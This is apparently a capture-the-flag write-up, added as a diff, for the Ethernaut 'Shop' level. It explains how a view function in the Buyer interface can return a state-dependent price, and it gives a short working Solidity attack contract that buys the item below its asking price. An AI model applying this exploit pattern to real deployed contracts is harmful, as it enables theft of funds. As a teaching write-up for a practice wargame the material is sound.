@@ -1,0 +1,52 @@
+---
+title: Level 21 - Shop
+slug: level-21
+published: 05-21-2023
+lastEdited:
+imgSrc: /images/ethernaut/ethernaut21.svg
+---
+
+## Objectives
+
+1. Obtain an item for less than the asked price.
+
+## Vulnerabilities
+
+### Interface functions
+
+`Interface` functions that have the `view` modifier can still be used to return different values based on another a contract's state.
+Indeed, view functions can still read state and therefore can use that fact to have conditionnals.
+
+## Exploit
+
+1. Write and deploy a hack contract like this one:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Shop.sol";
+
+contract ShopHack is Buyer {
+    Shop target;
+
+    constructor(address _targetAddress){
+        target = Shop(_targetAddress);
+    }
+
+    function price() external view returns(uint){
+        return target.isSold() ? 1 : 102;
+    }
+
+    function Hazaah() external {
+        target.buy();
+    }
+}
+```
+
+2. Call the `Hazaah`function to buy the item at a lower price than asked.
+
+## Further reading
+
+- Documentation of `view` functions <ExternalLink href={"https://docs.soliditylang.org/en/develop/contracts.html#view-functions"} />
+- Example of simple `view` and `pure` functions <ExternalLink href={"https://solidity-by-example.org/view-and-pure-functions/"} />
